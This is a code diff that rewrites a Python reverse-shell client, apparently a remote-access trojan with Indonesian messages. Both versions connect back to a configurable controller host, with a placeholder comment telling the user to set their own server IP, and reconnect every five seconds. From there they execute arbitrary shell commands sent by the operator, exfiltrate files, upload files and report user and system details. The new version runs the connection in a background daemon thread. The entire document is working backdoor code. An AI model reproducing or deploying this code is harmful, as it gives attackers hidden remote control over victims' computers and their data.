@@ -1,63 +1,98 @@
-import socket, platform, os, subprocess, time
+import socket
+import os
+import platform
+import subprocess
+import threading
+import time
+import getpass
 
-def sysinfo():
-    u = platform.uname()
-    ip = socket.gethostbyname(socket.gethostname())
-    return f"{u.system} {u.release} | {u.node} | {ip}"
+SERVER = '127.0.0.1'  # Ganti ke IP server kamu
+PORT = 80
+BUFFER = 4096
 
-def handle(cmd):
-    cmd = cmd.strip()
-    if cmd == "pwd": return os.getcwd()
-    elif cmd == "ls": return "\n".join(os.listdir())
-    elif cmd.startswith("cd "):
-        try: os.chdir(cmd[3:]); return f"Berpindah ke {os.getcwd()}"
-        except: return "[!] Gagal pindah direktori"
-    elif cmd == "whoami": return os.getlogin()
-    elif cmd == "sysinfo": return sysinfo()
-    elif cmd.startswith("shell "):
-        try: return subprocess.check_output(cmd[6:], shell=True).decode()
-        except: return "[!] Gagal eksekusi shell"
-    elif cmd.startswith("download "):
-        fn = cmd.split(" ",1)[1]
-        try:
-            with open(fn, "rb") as f: d = f.read()
-            s.send(b"[FILE]")
-            s.send(str(len(fn)).zfill(4).encode())
-            s.send(fn.encode())
-            s.send(d + b"[ENDFILE]")
-            return f"[+] File dikirim: {fn}"
-        except: return "[!] File tidak ditemukan"
-    else:
-        return "[?] Perintah tidak dikenali"
+def send_file(s, filepath):
+    try:
+        with open(filepath, 'rb') as f:
+            data = f.read()
+        s.send(str(len(data)).encode() + b'\n')
+        s.sendall(data)
+    except Exception:
+        s.send(b"0\n")
 
-def connect():
-    global s
+def receive_file(s, filename):
+    try:
+        size = int(s.recv(BUFFER).decode())
+        with open(filename, 'wb') as f:
+            while size > 0:
+                chunk = s.recv(min(BUFFER, size))
+                if not chunk:
+                    break
+                f.write(chunk)
+                size -= len(chunk)
+        s.send(b"[+] Upload selesai\n")
+    except:
+        s.send(b"[!] Gagal upload\n")
+
+def handle_server(s):
     while True:
         try:
-            s = socket.socket()
-            s.connect(("127.0.0.1", 80))
-            print("[*] Terhubung ke server... menunggu perintah.")
-            while True:
-                cmd = s.recv(1024).decode().strip()
-                if cmd == "[SYSINFO]":
-                    s.send(sysinfo().encode())
-                elif cmd == "[UPLOAD]":
-                    fnlen = int(s.recv(4).decode())
-                    fn = s.recv(fnlen).decode()
-                    data = b""
-                    while True:
-                        chunk = s.recv(1024)
-                        if b"[ENDFILE]" in chunk:
-                            data += chunk.split(b"[ENDFILE]")[0]
-                            break
-                        data += chunk
-                    with open(fn, "wb") as f: f.write(data)
-                else:
-                    result = handle(cmd)
-                    s.send(result.encode())
-        except:
-            print("[!] Koneksi gagal. Mencoba ulang dalam 5 detik...")
+            cmd = s.recv(BUFFER).decode(errors='ignore').strip()
+            if not cmd:
+                continue
+
+            if cmd == "exit":
+                break
+            elif cmd == "pwd":
+                s.send(os.getcwd().encode() + b'\n')
+            elif cmd.startswith("cd "):
+                try:
+                    os.chdir(cmd[3:])
+                    s.send(b"[+] Direktori berubah\n")
+                except Exception as e:
+                    s.send(f"[!] Gagal pindah direktori: {e}\n".encode())
+            elif cmd == "ls":
+                try:
+                    items = os.listdir()
+                    s.send("\n".join(items).encode() + b'\n')
+                except Exception as e:
+                    s.send(f"[!] Error listing file: {e}\n".encode())
+            elif cmd.startswith("download "):
+                filepath = cmd.split(" ", 1)[1]
+                send_file(s, filepath)
+            elif cmd.startswith("upload "):
+                filename = cmd.split(" ", 1)[1]
+                receive_file(s, filename)
+            elif cmd == "whoami":
+                try:
+                    s.send(getpass.getuser().encode() + b'\n')
+                except:
+                    s.send(b"[?] Gagal ambil user\n")
+            elif cmd == "sysinfo":
+                info = f"{platform.system()} {platform.release()} {platform.version()}"
+                s.send(info.encode() + b'\n')
+            elif cmd.startswith("shell "):
+                try:
+                    output = subprocess.check_output(cmd[6:], shell=True, stderr=subprocess.STDOUT)
+                    s.send(output + b'\n')
+                except subprocess.CalledProcessError as e:
+                    s.send(e.output + b'\n')
+            else:
+                s.send(f"[?] Perintah tidak dikenal: {cmd}\n".encode())
+        except Exception:
+            break
+    s.close()
+
+def connect():
+    while True:
+        try:
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                s.connect((SERVER, PORT))
+                handle_server(s)
+        except Exception:
             time.sleep(5)
+            continue
 
 if __name__ == "__main__":
-    connect()
+    threading.Thread(target=connect, daemon=True).start()
+    while True:
+        time.sleep(9999)
